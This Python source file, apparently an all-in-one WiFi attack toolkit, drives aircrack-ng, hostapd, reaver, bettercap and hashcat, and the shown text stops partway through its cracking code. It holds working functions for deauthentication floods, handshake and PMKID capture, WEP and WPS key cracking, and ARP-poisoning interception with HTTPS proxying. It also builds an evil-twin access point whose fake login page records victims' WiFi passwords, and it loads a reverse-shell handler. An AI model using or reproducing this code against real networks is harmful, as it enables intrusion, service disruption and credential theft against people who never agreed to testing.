#!/usr/bin/env python3
"""
wifi_monitor — full WiFi pentesting + LAN scanning toolkit.
Merges wifite automation, full aircrack-ng suite, injection, evil-twin,
MITM, WPS, PMKID, WEP, auto-crack pipeline, and LAN scanning.

secV interface: reads {"target":"...","params":{...}} from stdin → JSON stdout.

Modes
-----
  auto          : wifite-style full-auto: scan → rank → attack all targets
  monitor_on    : put interface into monitor mode
  monitor_off   : restore managed mode
  inject_test   : packet injection test (aireplay-ng --test)
  wifi_scan     : passive AP + client discovery (airodump-ng)
  capture       : WPA/WPA2 handshake capture (airodump-ng + optional deauth)
  deauth        : 802.11 deauth flood (aireplay-ng -0)
  evil_twin     : rogue AP with DHCP + optional captive portal (hostapd + dnsmasq)
  mitm          : ARP-poisoning MITM (arpspoof / bettercap)
  wps_scan      : scan WPS-enabled APs (wash)
  wps_attack    : WPS Pixie-Dust / PIN brute (reaver / bully)
  pmkid         : clientless PMKID capture (hcxdumptool)
  wep_attack    : WEP ARP-replay / chop-chop / fragmentation (aireplay-ng)
  crack         : crack .cap / .hc22000 (aircrack-ng / hashcat / airolib)
  auto_crack    : full pipeline: PMKID → handshake → aircrack → hashcat
  decrypt       : decrypt captured traffic (airdecap-ng)
  handshake_check: verify .cap contains a valid WPA handshake
  forge_packet  : craft + inject raw packet (packetforge-ng + aireplay-ng)
  scan          : LAN host discovery + port scan
  discover      : LAN host discovery only
  check_tools   : show which tools are installed
"""

import asyncio
import ipaddress
import json
import logging
import os
import re
import shutil
import socket
import ssl
import subprocess
import sys
import tempfile
import threading
import time
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime, timedelta
from pathlib import Path
from typing import Any, Dict, List, Optional, Set, Tuple

logging.basicConfig(level=logging.ERROR)

# ── Optional Python deps ──────────────────────────────────────────────────────
try:
    from scapy.all import ARP, Ether, srp
    HAS_SCAPY = True
except ImportError:
    HAS_SCAPY = False

try:
    import aiohttp
    HAS_AIOHTTP = True
except ImportError:
    HAS_AIOHTTP = False

# ── OnlyShell reverse shell handler ──────────────────────────────────────────
import importlib.util as _ilu

def _local_ip() -> str:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80)); ip = s.getsockname()[0]; s.close()
        return ip
    except Exception:
        return "0.0.0.0"

_RS_MOD = None
def _rs():
    global _RS_MOD
    if _RS_MOD is not None:
        return _RS_MOD
    for _c in [
        Path(__file__).parent.parent / "revshell" / "revshell.py",
        Path(__file__).parent / "revshell" / "revshell.py",
    ]:
        if _c.exists():
            _s = _ilu.spec_from_file_location("revshell", _c)
            _m = _ilu.module_from_spec(_s); _s.loader.exec_module(_m)
            _RS_MOD = _m; return _m
    return None

# ── Tool map ──────────────────────────────────────────────────────────────────
_TOOLS: Dict[str, Optional[str]] = {t: shutil.which(t) for t in (
    "airmon-ng", "airodump-ng", "aireplay-ng", "aircrack-ng",
    "airdecap-ng", "airolib-ng", "packetforge-ng",
    "iw", "iwconfig", "ip",
    "hostapd", "dnsmasq",
    "hcxdumptool", "hcxpcapngtool",
    "reaver", "wash", "bully",
    "arpspoof", "bettercap",
    "hashcat", "john",
    "tcpdump", "tshark",
    "systemctl", "nmcli",
)}

WIFI_DIR = Path.home() / ".secv" / "wifi"


def _mk(path: str) -> str:
    Path(path).mkdir(parents=True, exist_ok=True)
    return path


def _have(*tools) -> Tuple[bool, List[str]]:
    miss = [t for t in tools if not _TOOLS.get(t)]
    return not miss, miss


def _err(msg: str) -> Dict:
    return {"success": False, "error": msg}


def _ok(**kw) -> Dict:
    return {"success": True, **kw}


def _run(cmd: List[str], timeout: int = 30, env: dict = None,
         stdin_data: str = None) -> subprocess.CompletedProcess:
    return subprocess.run(
        cmd, capture_output=True, text=True, timeout=timeout,
        input=stdin_data, env={**os.environ, **(env or {})}
    )


def _bool(v) -> bool:
    if isinstance(v, bool):
        return v
    return str(v).lower() in ("1", "true", "yes", "on")


def _stamp() -> str:
    return datetime.now().strftime("%Y%m%d_%H%M%S")


def _stream_proc(cmd: List[str], duration: int, out: List[str],
                 stop: threading.Event, label: str = "wifi") -> subprocess.Popen:
    """Start cmd, stream lines into `out` for up to `duration` seconds."""
    proc = subprocess.Popen(
        cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
        text=True, errors="replace"
    )

    def _reader():
        deadline = time.time() + duration
        while time.time() < deadline and not stop.is_set():
            line = proc.stdout.readline()
            if not line and proc.poll() is not None:
                break
            if line:
                out.append(line.rstrip())
                print(f"[{label}] {line.rstrip()}", file=sys.stderr)
        proc.terminate()
        try:
            proc.wait(timeout=3)
        except subprocess.TimeoutExpired:
            proc.kill()

    t = threading.Thread(target=_reader, daemon=True)
    t.start()
    t.join()
    return proc


def _set_channel(iface: str, channel: str):
    if not channel:
        return
    if _TOOLS.get("iwconfig"):
        subprocess.run(["iwconfig", iface, "channel", str(channel)],
                       capture_output=True)
    elif _TOOLS.get("iw"):
        subprocess.run(["iw", "dev", iface, "set", "channel", str(channel)],
                       capture_output=True)


def _ip_forward(enable: bool):
    val = "1" if enable else "0"
    subprocess.run(["sysctl", "-w", f"net.ipv4.ip_forward={val}"],
                   capture_output=True)
    try:
        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
            f.write(val)
    except Exception:
        pass


# ── Monitor mode ──────────────────────────────────────────────────────────────

def op_monitor_on(iface: str) -> Dict:
    if not iface:
        return _err("iface required")

    # Kill interfering processes
    if _TOOLS.get("airmon-ng"):
        _run(["airmon-ng", "check", "kill"], timeout=10)

    if _TOOLS.get("airmon-ng"):
        try:
            r = _run(["airmon-ng", "start", iface], timeout=20)
            mon = iface + "mon"
            for line in r.stdout.splitlines():
                m = re.search(r'(wlan\w*mon)', line)
                if m:
                    mon = m.group(1)
                    break
            return _ok(monitor_iface=mon, method="airmon-ng", output=r.stdout.strip())
        except Exception as e:
            pass  # fall through to iw

    if _TOOLS.get("iw"):
        try:
            subprocess.run(["ip", "link", "set", iface, "down"], capture_output=True)
            subprocess.run(["iw", "dev", iface, "set", "type", "monitor"],
                           capture_output=True)
            subprocess.run(["ip", "link", "set", iface, "up"], capture_output=True)
            return _ok(monitor_iface=iface, method="iw")
        except Exception as e:
            return _err(str(e))

    return _err("airmon-ng and iw not found — install aircrack-ng")


def op_monitor_off(iface: str) -> Dict:
    if not iface:
        return _err("iface required")
    if _TOOLS.get("airmon-ng"):
        try:
            r = _run(["airmon-ng", "stop", iface], timeout=15)
            if _TOOLS.get("systemctl"):
                subprocess.Popen(["systemctl", "restart", "NetworkManager"],
                                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            elif _TOOLS.get("nmcli"):
                subprocess.Popen(["nmcli", "networking", "on"],
                                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            return _ok(output=r.stdout.strip())
        except Exception as e:
            pass
    if _TOOLS.get("iw"):
        try:
            subprocess.run(["ip", "link", "set", iface, "down"], capture_output=True)
            subprocess.run(["iw", "dev", iface, "set", "type", "managed"],
                           capture_output=True)
            subprocess.run(["ip", "link", "set", iface, "up"], capture_output=True)
            return _ok(method="iw")
        except Exception as e:
            return _err(str(e))
    return _err("airmon-ng and iw not found")


# ── Injection test ────────────────────────────────────────────────────────────

def op_inject_test(iface: str) -> Dict:
    ok, _ = _have("aireplay-ng")
    if not ok:
        return _err("aireplay-ng not found — install aircrack-ng")
    try:
        r = _run(["aireplay-ng", "--test", iface], timeout=25)
        out = r.stdout + r.stderr
        working = bool(re.search(r'injection is working', out, re.I))
        acks = 0
        m = re.search(r'(\d+)/30:\s+\d+%', out)
        if m:
            acks = int(m.group(1))
        return _ok(injection_capable=working, acks=acks, output=out.strip())
    except Exception as e:
        return _err(str(e))


# ── WiFi scan ─────────────────────────────────────────────────────────────────

def op_wifi_scan(iface: str, duration: int = 15, channel: str = "",
                 band: str = "bg", manufacturer: bool = True) -> Dict:
    ok, _ = _have("airodump-ng")
    if not ok:
        return _err("airodump-ng not found")

    with tempfile.TemporaryDirectory() as td:
        prefix = os.path.join(td, "scan")
        cmd = ["airodump-ng", "--write", prefix, "--output-format", "csv", iface]
        if channel:
            cmd += ["-c", str(channel)]
        if band:
            cmd += ["--band", band]

        lines: List[str] = []
        stop = threading.Event()
        _stream_proc(cmd, duration, lines, stop, "scan")

        aps, clients = _parse_airodump_csv(prefix + "-01.csv")

        # Enrich: rank by signal, flag open/WEP/WPS
        for ap in aps:
            try:
                ap["signal_dbm"] = int(ap.get("power", "-100").strip() or "-100")
            except Exception:
                ap["signal_dbm"] = -100
            priv = ap.get("privacy", "").upper()
            ap["encryption"] = ("OPEN" if not priv or priv == "OPN"
                                else "WEP" if "WEP" in priv
                                else "WPA2" if "WPA2" in priv
                                else "WPA")

        aps.sort(key=lambda x: x.get("signal_dbm", -100), reverse=True)
        return _ok(access_points=aps, clients=clients,
                   ap_count=len(aps), client_count=len(clients))


def _parse_airodump_csv(path: str) -> Tuple[List[Dict], List[Dict]]:
    aps: List[Dict] = []
    clients: List[Dict] = []
    section = "ap"
    try:
        with open(path, errors="replace") as f:
            for raw in f:
                line = raw.strip()
                if not line:
                    continue
                if line.startswith("Station MAC"):
                    section = "client"
                    continue
                if line.startswith("BSSID") and section == "ap":
                    continue
                parts = [p.strip() for p in line.split(",")]
                if section == "ap" and len(parts) >= 14:
                    aps.append({
                        "bssid": parts[0], "first_seen": parts[1],
                        "last_seen": parts[2], "channel": parts[3],
                        "speed": parts[4], "privacy": parts[5],
                        "cipher": parts[6], "auth": parts[7],
                        "power": parts[8], "beacons": parts[9],
                        "data_frames": parts[10], "essid": parts[13],
                    })
                elif section == "client" and len(parts) >= 6:
                    clients.append({
                        "mac": parts[0], "first_seen": parts[1],
                        "last_seen": parts[2], "power": parts[3],
                        "packets": parts[4], "bssid": parts[5],
                        "probed": parts[6] if len(parts) > 6 else "",
                    })
    except Exception:
        pass
    return aps, clients


# ── Deauthentication ──────────────────────────────────────────────────────────

def op_deauth(iface: str, bssid: str, client: str = "FF:FF:FF:FF:FF:FF",
              count: int = 10, channel: str = "", interval: float = 0.0) -> Dict:
    ok, _ = _have("aireplay-ng")
    if not ok:
        return _err("aireplay-ng not found")
    if not bssid:
        return _err("bssid required")
    _set_channel(iface, channel)

    # 0 = continuous flood; otherwise send `count` frames
    cmd = ["aireplay-ng", "--deauth", str(count),
           "-a", bssid, "-c", client, iface]
    if interval:
        cmd += ["--deauth-rc", str(interval)]

    try:
        timeout = max(30, count * 2 + 5)
        r = _run(cmd, timeout=timeout)
        out = r.stdout + r.stderr
        sent = count
        m = re.search(r'Sending (\d+)', out)
        if m:
            sent = int(m.group(1))
        return _ok(bssid=bssid, client=client, frames_sent=sent,
                   output=out.strip()[-400:])
    except subprocess.TimeoutExpired:
        return _ok(bssid=bssid, note="deauth sent (timeout)")
    except Exception as e:
        return _err(str(e))


# ── Handshake capture ─────────────────────────────────────────────────────────

def op_capture(iface: str, bssid: str, channel: str,
               out_dir: str = "", duration: int = 60,
               deauth: bool = True, deauth_count: int = 5,
               client: str = "FF:FF:FF:FF:FF:FF",
               essid: str = "") -> Dict:
    ok, _ = _have("airodump-ng")
    if not ok:
        return _err("airodump-ng not found")
    if not bssid or not channel:
        return _err("bssid and channel required")

    save_dir = out_dir or _mk(str(WIFI_DIR / "captures"))
    prefix = os.path.join(save_dir, f"hs_{_stamp()}")

    cmd = ["airodump-ng", "-c", str(channel), "--bssid", bssid,
           "-w", prefix, "--output-format", "pcap", iface]
    if essid:
        cmd += ["--essid", essid]

    lines: List[str] = []
    stop = threading.Event()
    t = threading.Thread(
        target=_stream_proc, args=(cmd, duration, lines, stop, "capture"),
        daemon=True
    )
    t.start()

    # Staggered deauths to trigger reconnect
    if deauth and _TOOLS.get("aireplay-ng"):
        for wave in range(3):
            time.sleep(3 + wave * 8)
            subprocess.Popen(
                ["aireplay-ng", "--deauth", str(deauth_count),
                 "-a", bssid, "-c", client, iface],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )

    t.join()

    cap_file = prefix + "-01.cap"
    hs_found = False
    if os.path.exists(cap_file) and _TOOLS.get("aircrack-ng"):
        try:
            r = _run(["aircrack-ng", cap_file], timeout=15)
            hs_found = "handshake" in (r.stdout + r.stderr).lower()
        except Exception:
            pass

    return _ok(
        capture_file=cap_file if os.path.exists(cap_file) else None,
        handshake_found=hs_found,
        duration_s=duration, bssid=bssid, channel=channel,
        lines=lines[-20:],
    )


def op_handshake_check(cap_file: str, bssid: str = "", essid: str = "") -> Dict:
    if not cap_file or not os.path.exists(cap_file):
        return _err(f"file not found: {cap_file}")
    ok, _ = _have("aircrack-ng")
    if not ok:
        return _err("aircrack-ng not found")
    cmd = ["aircrack-ng", cap_file]
    if bssid:
        cmd += ["-b", bssid]
    if essid:
        cmd += ["-e", essid]
    try:
        r = _run(cmd, timeout=15)
        out = r.stdout + r.stderr
        found = bool(re.search(r'handshake', out, re.I))
        # Extract network list
        nets = []
        for line in out.splitlines():
            m = re.match(r'\s*\d+\s+([\w:]+)\s+(.+)', line)
            if m:
                nets.append({"bssid": m.group(1), "essid": m.group(2).strip()})
        return _ok(handshake_found=found, networks=nets, output=out.strip()[-600:])
    except Exception as e:
        return _err(str(e))


# ── WEP attacks ───────────────────────────────────────────────────────────────

def op_wep_attack(iface: str, bssid: str, channel: str,
                  client_mac: str = "", method: str = "arp_replay",
                  out_dir: str = "", duration: int = 300) -> Dict:
    ok, _ = _have("aireplay-ng", "airodump-ng", "aircrack-ng")
    if not ok:
        return _err("aircrack-ng suite (aireplay-ng, airodump-ng, aircrack-ng) required")
    if not bssid or not channel:
        return _err("bssid and channel required")

    save_dir = out_dir or _mk(str(WIFI_DIR / "wep"))
    prefix = os.path.join(save_dir, f"wep_{_stamp()}")

    # Start airodump-ng capture
    dump_cmd = ["airodump-ng", "-c", str(channel), "--bssid", bssid,
                "-w", prefix, "--output-format", "ivs,pcap", iface]
    dump_stop = threading.Event()
    dump_lines: List[str] = []
    dump_t = threading.Thread(
        target=_stream_proc, args=(dump_cmd, duration, dump_lines, dump_stop, "wep-dump"),
        daemon=True
    )
    dump_t.start()
    time.sleep(3)

    # Fake auth (associate with AP)
    if _TOOLS.get("aireplay-ng"):
        subprocess.Popen(
            ["aireplay-ng", "--fakeauth", "0", "-a", bssid, iface],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        time.sleep(2)

    # Attack
    atk_lines: List[str] = []
    atk_stop = threading.Event()
    if method == "arp_replay":
        atk_cmd = ["aireplay-ng", "--arpreplay", "-b", bssid, iface]
        if client_mac:
            atk_cmd += ["-h", client_mac]
    elif method == "chopchop":
        atk_cmd = ["aireplay-ng", "--chopchop", "-b", bssid, iface]
    elif method == "fragment":
        atk_cmd = ["aireplay-ng", "--fragment", "-b", bssid, iface]
    elif method == "caffe_latte":
        atk_cmd = ["aireplay-ng", "--caffe-latte", "-b", bssid, iface]
    else:
        dump_stop.set()
        return _err(f"Unknown WEP method '{method}'. Use: arp_replay, chopchop, fragment, caffe_latte")

    atk_t = threading.Thread(
        target=_stream_proc, args=(atk_cmd, duration, atk_lines, atk_stop, "wep-atk"),
        daemon=True
    )
    atk_t.start()
    dump_t.join()
    atk_stop.set()
    atk_t.join()

    # Try to crack
    cap_file = prefix + "-01.ivs"
    if not os.path.exists(cap_file):
        cap_file = prefix + "-01.cap"

    key = None
    if os.path.exists(cap_file):
        try:
            r = _run(["aircrack-ng", cap_file], timeout=60)
            m = re.search(r'KEY FOUND!\s+\[(.+?)\]', r.stdout + r.stderr)
            if m:
                key = m.group(1).strip()
        except Exception:
            pass

    return _ok(
        bssid=bssid, method=method,
        capture_file=cap_file if os.path.exists(cap_file) else None,
        key_found=key is not None, key=key,
        dump_lines=dump_lines[-10:], atk_lines=atk_lines[-10:],
    )


# ── Packet forge + inject ─────────────────────────────────────────────────────

def op_forge_packet(iface: str, bssid: str, dmac: str = "FF:FF:FF:FF:FF:FF",
                    smac: str = "", arp_ip: str = "255.255.255.255",
                    repeat: int = 1000, cap_file: str = "") -> Dict:
    ok, _ = _have("packetforge-ng", "aireplay-ng")
    if not ok:
        return _err("packetforge-ng and aireplay-ng required (aircrack-ng suite)")
    if not smac and not cap_file:
        return _err("smac (source MAC) or cap_file required")

    with tempfile.TemporaryDirectory() as td:
        out_pkt = os.path.join(td, "forged.cap")
        cmd = ["packetforge-ng", "--arp",
               "-a", bssid, "-h", smac or bssid,
               "-k", arp_ip, "-l", arp_ip,
               "-y", cap_file or "", "-w", out_pkt]
        try:
            _run(cmd, timeout=15)
        except Exception as e:
            return _err(f"packetforge-ng failed: {e}")

        if not os.path.exists(out_pkt):
            return _err("packetforge-ng produced no output")

        # Inject
        inject_cmd = ["aireplay-ng", "--interactive", "-r", out_pkt,
                      "-x", str(repeat), iface]
        try:
            r = _run(inject_cmd, timeout=30)
            return _ok(injected=True, repeat=repeat, output=r.stdout.strip()[-300:])
        except Exception as e:
            return _err(f"injection failed: {e}")


# ── Evil twin + captive portal ────────────────────────────────────────────────

_CAPTIVE_HTML = """<!DOCTYPE html><html><head><meta charset="utf-8">
<title>WiFi Login</title>
<style>body{{font-family:Arial;background:#1a1a2e;color:#eee;display:flex;
align-items:center;justify-content:center;height:100vh;margin:0}}
.box{{background:#16213e;padding:40px;border-radius:12px;width:320px;text-align:center}}
h2{{color:#0f3460}}input{{width:100%;padding:10px;margin:8px 0;box-sizing:border-box;
border-radius:6px;border:none}}button{{background:#0f3460;color:#fff;padding:10px 20px;
border:none;border-radius:6px;cursor:pointer;width:100%}}</style></head>
<body><div class="box"><h2>{essid}</h2><p>Enter your password to continue</p>
<form method="POST"><input name="pass" type="password" placeholder="WiFi Password">
<button type="submit">Connect</button></form></div></body></html>"""


def op_evil_twin(iface: str, essid: str, channel: str = "6",
                 password: str = "", with_dhcp: bool = True,
                 ap_ip: str = "10.0.0.1", duration: int = 120,
                 captive_portal: bool = False,
                 captive_port: int = 8080) -> Dict:
    ok, _ = _have("hostapd")
    if not ok:
        return _err("hostapd not found")

    with tempfile.TemporaryDirectory() as td:
        # hostapd config
        ha_conf = os.path.join(td, "hostapd.conf")
        cfg = [
            f"interface={iface}", f"ssid={essid}",
            f"channel={channel}", "driver=nl80211", "hw_mode=g",
            "ignore_broadcast_ssid=0", "wmm_enabled=0",
        ]
        if password:
            cfg += [
                "wpa=2", f"wpa_passphrase={password}",
                "wpa_key_mgmt=WPA-PSK", "rsn_pairwise=CCMP",
            ]
        with open(ha_conf, "w") as f:
            f.write("\n".join(cfg) + "\n")

        # Assign IP
        _run(["ip", "addr", "flush", "dev", iface])
        _run(["ip", "addr", "add", f"{ap_ip}/24", "dev", iface])
        _run(["ip", "link", "set", iface, "up"])
        _ip_forward(True)

        # dnsmasq
        dm_proc = None
        if with_dhcp and _TOOLS.get("dnsmasq"):
            net = ap_ip.rsplit(".", 1)[0]
            dm_conf = os.path.join(td, "dnsmasq.conf")
            with open(dm_conf, "w") as f:
                f.write(
                    f"interface={iface}\n"
                    f"dhcp-range={net}.10,{net}.200,1h\n"
                    f"dhcp-option=3,{ap_ip}\n"
                    f"dhcp-option=6,{ap_ip}\n"
                    "no-resolv\n"
                )
                if captive_portal:
                    # Redirect all DNS to us for captive portal
                    f.write(f"address=/#/{ap_ip}\n")
            dm_proc = subprocess.Popen(
                ["dnsmasq", "-C", dm_conf, "--no-daemon"],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )

        # Captive portal (simple Python HTTP server)
        cred_file = os.path.join(str(WIFI_DIR / "evil_twin"), f"creds_{_stamp()}.txt")
        _mk(str(WIFI_DIR / "evil_twin"))
        portal_proc = None
        if captive_portal:
            portal_script = os.path.join(td, "portal.py")
            html = _CAPTIVE_HTML.format(essid=essid)
            with open(portal_script, "w") as f:
                f.write(
                    "import http.server,urllib.parse,json,sys\n"
                    f"CRED_FILE='{cred_file}'\n"
                    f"HTML='''{html}'''\n"
                    "class H(http.server.BaseHTTPRequestHandler):\n"
                    "    def log_message(self,*a):pass\n"
                    "    def do_GET(self):\n"
                    "        self.send_response(200);self.send_header('Content-Type','text/html')\n"
                    "        self.end_headers();self.wfile.write(HTML.encode())\n"
                    "    def do_POST(self):\n"
                    "        n=int(self.headers.get('Content-Length',0))\n"
                    "        d=urllib.parse.parse_qs(self.rfile.read(n).decode())\n"
                    "        pw=d.get('pass',[''])[0]\n"
                    "        open(CRED_FILE,'a').write(f'{self.client_address[0]}\\t{pw}\\n')\n"
                    "        self.send_response(302);self.send_header('Location','http://google.com')\n"
                    "        self.end_headers()\n"
                    f"http.server.HTTPServer(('{ap_ip}',{captive_port}),H).serve_forever()\n"
                )
            portal_proc = subprocess.Popen(
                [sys.executable, portal_script],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )

        lines: List[str] = []
        stop = threading.Event()
        _stream_proc(["hostapd", ha_conf], duration, lines, stop, "evil-twin")

        if dm_proc:
            dm_proc.terminate()
        if portal_proc:
            portal_proc.terminate()
        _ip_forward(False)

        captured_creds = []
        if captive_portal and os.path.exists(cred_file):
            with open(cred_file) as f:
                for line in f:
                    parts = line.strip().split("\t")
                    if len(parts) == 2:
                        captured_creds.append({"ip": parts[0], "password": parts[1]})

        return _ok(
            essid=essid, channel=channel, ap_ip=ap_ip,
            open=not bool(password), dhcp=dm_proc is not None,
            captive_portal=captive_portal,
            captured_credentials=captured_creds,
            credential_file=cred_file if captured_creds else None,
            duration_s=duration, lines=lines[-30:],
        )


# ── ARP MITM ─────────────────────────────────────────────────────────────────

def op_mitm(iface: str, victim: str, gateway: str, duration: int = 60,
            capture: bool = True, strip_ssl: bool = False) -> Dict:
    if not victim or not gateway:
        return _err("victim and gateway required")

    # Try bettercap first (more capable)
    if _TOOLS.get("bettercap"):
        return _mitm_bettercap(iface, victim, gateway, duration, strip_ssl)

    ok, _ = _have("arpspoof")
    if not ok:
        return _err("arpspoof (dsniff) or bettercap required")

    _ip_forward(True)

    cap_file = None
    tcp_proc = None
    if capture and _TOOLS.get("tcpdump"):
        cap_dir = _mk(str(WIFI_DIR / "mitm"))
        cap_file = os.path.join(cap_dir, f"mitm_{_stamp()}.pcap")
        tcp_proc = subprocess.Popen(
            ["tcpdump", "-i", iface, "-w", cap_file, "host", victim, "-q"],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )

    procs = []
    for src, dst in [(gateway, victim), (victim, gateway)]:
        p = subprocess.Popen(
            ["arpspoof", "-i", iface, "-t", src, dst],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        procs.append(p)

    print(f"[mitm] poisoning {victim} ↔ {gateway} for {duration}s", file=sys.stderr)
    time.sleep(duration)

    for p in procs:
        p.terminate()
    if tcp_proc:
        tcp_proc.terminate()
    _ip_forward(False)

    return _ok(
        victim=victim, gateway=gateway, method="arpspoof",
        duration_s=duration, capture_file=cap_file,
    )


def _mitm_bettercap(iface: str, victim: str, gateway: str,
                    duration: int, strip_ssl: bool) -> Dict:
    cap_dir = _mk(str(WIFI_DIR / "mitm"))
    cap_file = os.path.join(cap_dir, f"mitm_{_stamp()}.pcap")
    cmds = [
        f"set arp.spoof.targets {victim}",
        "arp.spoof on",
        "net.sniff on",
        f"set net.sniff.output {cap_file}",
    ]
    if strip_ssl:
        cmds.append("https.proxy on")
    cmds += [f"sleep {duration}", "arp.spoof off", "exit"]

    try:
        r = _run(
            ["bettercap", "-iface", iface, "-eval", ";".join(cmds)],
            timeout=duration + 15
        )
        return _ok(
            victim=victim, gateway=gateway, method="bettercap",
            duration_s=duration, capture_file=cap_file,
            output=r.stdout[-400:],
        )
    except Exception as e:
        return _err(str(e))


# ── WPS scan ──────────────────────────────────────────────────────────────────

def op_wps_scan(iface: str, channel: str = "", duration: int = 30) -> Dict:
    ok, _ = _have("wash")
    if not ok:
        return _err("wash not found — install reaver")

    cmd = ["wash", "-i", iface]
    if channel:
        cmd += ["-c", str(channel)]

    lines: List[str] = []
    stop = threading.Event()
    _stream_proc(cmd, duration, lines, stop, "wps-scan")

    aps: List[Dict] = []
    for line in lines:
        parts = line.split()
        if len(parts) >= 5 and re.match(r'([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}', parts[0]):
            aps.append({
                "bssid": parts[0],
                "channel": parts[1] if len(parts) > 1 else "",
                "rssi": parts[2] if len(parts) > 2 else "",
                "wps_version": parts[3] if len(parts) > 3 else "",
                "locked": parts[4] == "Yes" if len(parts) > 4 else False,
                "essid": " ".join(parts[6:]) if len(parts) > 6 else "",
            })
    return _ok(wps_aps=aps, count=len(aps),
               unlocked=[a for a in aps if not a.get("locked")])


# ── WPS attack ────────────────────────────────────────────────────────────────

def op_wps_attack(iface: str, bssid: str, channel: str,
                  pixiedust: bool = True, pin: str = "",
                  timeout: int = 3600) -> Dict:
    if not bssid or not channel:
        return _err("bssid and channel required")

    ok_r, _ = _have("reaver")
    ok_b, _ = _have("bully")
    if not ok_r and not ok_b:
        return _err("reaver or bully not found")

    _set_channel(iface, channel)

    if ok_r:
        cmd = ["reaver", "-i", iface, "-b", bssid, "-c", str(channel), "-vv"]
        if pixiedust:
            cmd += ["-K", "1"]
        if pin:
            cmd += ["-p", pin]
        lines: List[str] = []
        stop = threading.Event()
        _stream_proc(cmd, timeout, lines, stop, "wps-reaver")
        wps_pin = psk = None
        for ln in lines:
            m = re.search(r'WPS PIN[:\s]+(\d+)', ln)
            if m:
                wps_pin = m.group(1)
            m = re.search(r'WPA PSK[:\s]+["\']?([^"\']+)', ln)
            if m:
                psk = m.group(1).strip()
        return _ok(bssid=bssid, method="reaver", pixiedust=pixiedust,
                   wps_pin=wps_pin, wpa_psk=psk,
                   cracked=wps_pin is not None or psk is not None,
                   lines=lines[-20:])

    # bully fallback
    cmd = ["bully", "-b", bssid, "-c", str(channel), "-d", "-v", "3", iface]
    if pin:
        cmd += ["-p", pin]
    lines = []
    stop = threading.Event()
    _stream_proc(cmd, timeout, lines, stop, "wps-bully")
    wps_pin = psk = None
    for ln in lines:
        m = re.search(r'Pin\s*:\s*(\d+)', ln)
        if m:
            wps_pin = m.group(1)
        m = re.search(r'Passphrase\s*:\s*(.+)', ln)
        if m:
            psk = m.group(1).strip()
    return _ok(bssid=bssid, method="bully", wps_pin=wps_pin, wpa_psk=psk,
               cracked=wps_pin is not None or psk is not None, lines=lines[-20:])


# ── PMKID ─────────────────────────────────────────────────────────────────────

def op_pmkid(iface: str, bssid: str = "", duration: int = 60,
             out_dir: str = "") -> Dict:
    ok, _ = _have("hcxdumptool")
    if not ok:
        return _err("hcxdumptool not found")

    save_dir = out_dir or _mk(str(WIFI_DIR / "pmkid"))
    stamp = _stamp()
    pcapng = os.path.join(save_dir, f"pmkid_{stamp}.pcapng")
    hc_file = os.path.join(save_dir, f"pmkid_{stamp}.hc22000")

    cmd = ["hcxdumptool", "-i", iface, "-o", pcapng,
           "--enable_status=1", "--active_beacon"]
    if bssid:
        flt = os.path.join(save_dir, "filter.txt")
        with open(flt, "w") as f:
            f.write(bssid.replace(":", "").lower() + "\n")
        cmd += [f"--filterlist_ap={flt}", "--filtermode=2"]

    lines: List[str] = []
    stop = threading.Event()
    _stream_proc(cmd, duration, lines, stop, "pmkid")

    converted = False
    if os.path.exists(pcapng) and _TOOLS.get("hcxpcapngtool"):
        try:
            _run(["hcxpcapngtool", pcapng, "-o", hc_file], timeout=30)
            converted = os.path.exists(hc_file) and os.path.getsize(hc_file) > 0
        except Exception:
            pass

    pmkid_count = 0
    for ln in lines:
        if "PMKID" in ln:
            pmkid_count += 1

    return _ok(
        pcapng_file=pcapng if os.path.exists(pcapng) else None,
        hc22000_file=hc_file if converted else None,
        hashcat_ready=converted,
        pmkid_captured=pmkid_count,
        duration_s=duration,
        lines=lines[-20:],
    )


# ── Crack (aircrack-ng / hashcat / airolib) ───────────────────────────────────

def op_crack(cap_file: str, wordlist: str = "", bssid: str = "",
             essid: str = "", use_hashcat: bool = False,
             airolib_db: str = "", rules: str = "") -> Dict:
    if not cap_file or not os.path.exists(cap_file):
        return _err(f"capture file not found: {cap_file}")

    # hashcat path for .hc22000 / .22000
    if use_hashcat or cap_file.endswith((".hc22000", ".22000")):
        return _crack_hashcat(cap_file, wordlist, rules)

    # airolib PMK database
    if airolib_db:
        return _crack_airolib(cap_file, airolib_db, bssid, essid)

    ok, _ = _have("aircrack-ng")
    if not ok:
        return _err("aircrack-ng not found")
    if not wordlist or not os.path.exists(wordlist):
        return _err(f"wordlist not found: {wordlist}")

    cmd = ["aircrack-ng", cap_file, "-w", wordlist]
    if bssid:
        cmd += ["-b", bssid]
    if essid:
        cmd += ["-e", essid]

    try:
        r = _run(cmd, timeout=0x7FFFFFFF)  # no timeout for cracking
        out = r.stdout + r.stderr
        m = re.search(r'KEY FOUND!\s+\[\s*(.+?)\s*\]', out)
        key = m.group(1) if m else None
        tried = 0
        m2 = re.search(r'(\d+) keys tested', out)
        if m2:
            tried = int(m2.group(1))
        return _ok(key_found=key is not None, key=key,
                   keys_tested=tried, output=out[-800:])
    except subprocess.TimeoutExpired:
        return _ok(key_found=False, note="timed out")
    except Exception as e:
        return _err(str(e))


def _crack_hashcat(hc_file: str, wordlist: str, rules: str = "") -> Dict:
    ok, _ = _have("hashcat")
    if not ok:
        return _err("hashcat not found")
    if not wordlist or not os.path.exists(wordlist):
        return _err(f"wordlist not found: {wordlist}")
    cmd = ["hashcat", "-m", "22000", hc_file, wordlist, "--force", "-q", "--status"]
    if rules and os.path.exists(rules):
        cmd += ["-r", rules]
    try:
        r = _run(cmd, timeout=0x7FFFFFFF)
        key = None
        for line in (r.stdout + r.stderr).splitlines():
            if ":" in line and not line.startswith(("#", "$", "[")):
                parts = line.rsplit(":", 1)
